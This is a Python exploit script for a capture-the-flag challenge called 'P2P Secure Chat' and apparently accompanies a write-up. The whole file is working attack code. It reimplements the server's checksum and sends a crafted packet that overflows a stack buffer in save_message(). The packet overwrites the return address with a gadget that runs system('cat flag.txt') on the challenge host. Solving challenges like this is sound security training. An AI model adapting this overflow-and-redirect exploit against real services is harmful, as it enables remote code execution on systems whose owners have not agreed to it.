#!/usr/bin/env python3
"""
putcCTF - P2P Secure Chat exploit

This script reproduces the exploit path used in the writeup:
1. Enter the "Send Message" menu.
2. Send a valid custom packet with a correct checksum.
3. Overflow save_message()'s stack buffer.
4. Redirect execution into the built-in gadget that calls:
       system("cat flag.txt")
"""

from __future__ import annotations

import argparse
import socket
import struct
import time


MAGIC = 0xCAFEBABE
HOST = "p2p.putcyberdays.pl"
PORT = 8080

# useful_gadgets() contains:
#   0x40120a: lea rax, [rip + "cat flag.txt"]
#   0x401211: mov rdi, rax
#   0x401214: call system
#   0x401219: pop rdi
#   0x40121a: ret
GADGET_SYSTEM_CAT_FLAG = 0x40120A
MAIN_ADDR = 0x4016BE
RIP_OFFSET = 88


def recv_available(sock: socket.socket, delay: float = 0.10) -> bytes:
    """Collect currently available data without blocking forever."""
    time.sleep(delay)
    chunks: list[bytes] = []
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def calculate_checksum(data: bytes) -> int:
    """
    Reimplementation of calculate_checksum() from the server binary.

    Pseudocode from disassembly:
        c = 0x12345678
        for i, byte in enumerate(data):
            c ^= (signed_byte << (i & 3))
            c = rol32(c, 5)
    """
    checksum = 0x12345678
    for i, byte in enumerate(data):
        signed_byte = byte - 256 if byte >= 0x80 else byte
        checksum ^= (signed_byte << (i & 3)) & 0xFFFFFFFF
        checksum = ((checksum << 5) | (checksum >> 27)) & 0xFFFFFFFF
    return checksum


def build_payload() -> bytes:
    """
    Build a stable exploit payload.

    save_message() copies attacker data into a 0x50-byte stack buffer and then
    prints it with "%s". To avoid crashing inside fprintf() before the function
    returns, the first 80 bytes are made into a proper C string by ending them
    with a NUL byte.
    """
    body = b"A" * 79
    body += b"\x00"
    body += b"B" * (RIP_OFFSET - len(body))
    body += struct.pack("<Q", GADGET_SYSTEM_CAT_FLAG)
    body += struct.pack("<Q", 0xDEADBEEFDEADBEEF)  # consumed by "pop rdi"
    body += struct.pack("<Q", MAIN_ADDR)  # optional cleanup return
    return body


def build_packet(body: bytes) -> bytes:
    checksum = calculate_checksum(body)
    header = struct.pack("<III", MAGIC, len(body), checksum)
    return header + body


def exploit(host: str, port: int, username: str) -> bytes:
    packet = build_packet(build_payload())

    with socket.create_connection((host, port), timeout=5) as sock:
        sock.settimeout(1.0)

        recv_available(sock)
        sock.sendall(b"1\n")
        recv_available(sock)
        sock.sendall(username.encode() + b"\n")
        recv_available(sock)
        sock.sendall(packet)

        time.sleep(0.5)
        return recv_available(sock, delay=0.0)


def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit putcCTF P2P Secure Chat")
    parser.add_argument("--host", default=HOST, help="target host")
    parser.add_argument("--port", type=int, default=PORT, help="target port")
    parser.add_argument("--username", default="alice", help="chat username")
    args = parser.parse_args()

    result = exploit(args.host, args.port, args.username)
    print(result.decode("latin1", errors="replace"))


if __name__ == "__main__":
    main()
